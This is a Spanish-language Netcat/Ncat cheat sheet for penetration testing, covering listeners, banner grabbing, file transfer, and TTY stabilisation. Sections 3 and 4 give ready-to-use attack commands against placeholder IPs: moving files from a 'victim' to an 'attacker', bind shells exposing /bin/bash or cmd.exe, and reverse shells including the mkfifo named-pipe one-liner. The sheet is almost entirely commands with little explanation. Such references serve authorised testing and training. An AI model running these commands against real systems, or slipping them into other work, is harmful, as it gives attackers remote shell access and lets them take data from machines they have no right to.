# Netcat & Ncat Cheat Sheet

Comandos rápidos para Netcat (`nc`) y Ncat para transferencia de archivos, escucha de reverse shells, banner grabbing y escaneo de puertos.

---

## 1. Escucha de Shells (Listeners)

```bash
# Iniciar escucha en puerto TCP 4444
nc -lvnp 4444

# Escucha en Ncat especificando IPv4 explícitamente
ncat -4 -lvnp 4444
```
* `-l` : Modo escucha (listen).
* `-v` : Modo verboso (verbose).
* `-n` : Desactivar resolución DNS.
* `-p` : Puerto local de escucha.

---

## 2. Banner Grabbing e Inspección de Servicios

```bash
# Conexión manual a un servicio web, SSH o FTP para inspeccionar cabeceras
nc -vn <IP_OBJETIVO> 80
nc -vn <IP_OBJETIVO> 21
nc -vn <IP_OBJETIVO> 22
```

---

## 3. Transferencia de Archivos

### Método A: Enviar un archivo desde la máquina víctima a la atacante

1. **En la máquina Atacante (Receptor)**:
   ```bash
   nc -lvnp 9001 > recibido.exe
   ```
2. **En la máquina Víctima (Emisor)**:
   ```bash
   nc <IP_ATACANTE> 9001 < archivo.exe
   ```

### Método B: Enviar un archivo desde la máquina atacante a la víctima

1. **En la máquina Víctima (Receptor)**:
   ```bash
   nc -lvnp 9001 > recibido.txt
   ```
2. **En la máquina Atacante (Emisor)**:
   ```bash
   nc <IP_VICTIMA> 9001 < local_script.sh
   ```

---

## 4. Bind Shells y Reverse Shells directas con Netcat

### Bind Shell (La máquina objetivo abre el puerto y ejecuta shell)
* **Objetivo (Escucha)**:
  ```bash
  nc -lvnp 4444 -e /bin/bash         # Linux
  nc -lvnp 4444 -e cmd.exe           # Windows
  ```
* **Atacante (Conecta)**:
  ```bash
  nc <IP_OBJETIVO> 4444
  ```

### Reverse Shell (La máquina objetivo se conecta de vuelta al atacante)
* **Atacante (Escucha)**:
  ```bash
  nc -lvnp 4444
  ```
* **Objetivo (Conecta)**:
  ```bash
  nc <IP_ATACANTE> 4444 -e /bin/bash   # Linux con flag -e
  nc <IP_ATACANTE> 4444 -e cmd.exe     # Windows con flag -e
  
  # Si Netcat no soporta -e (OpenBSD netcat), usar Named Pipe (FIFO):
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP_ATACANTE> 4444 > /tmp/f
  ```

---

## 5. Estabilización de TTY Shell en Linux

Tras recibir una reverse shell en netcat, ejecuta los siguientes pasos para obtener una terminal interactiva con autocompletado Tab y tamaño correcto:

```bash
# 1. Spawnear una terminal PTY con Python dentro de la reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Suspender la shell de netcat presionando Ctrl + Z

# 3. En tu máquina atacante (consola local), configurar la terminal en modo raw y reanudar:
stty raw -echo; fg

# 4. Una vez devuelto a la shell, exportar las variables de entorno:
export TERM=xterm
export SHELL=/bin/bash

# (Opcional) Ajustar filas y columnas según tu ventana de terminal actual:
stty rows 38 columns 160
```
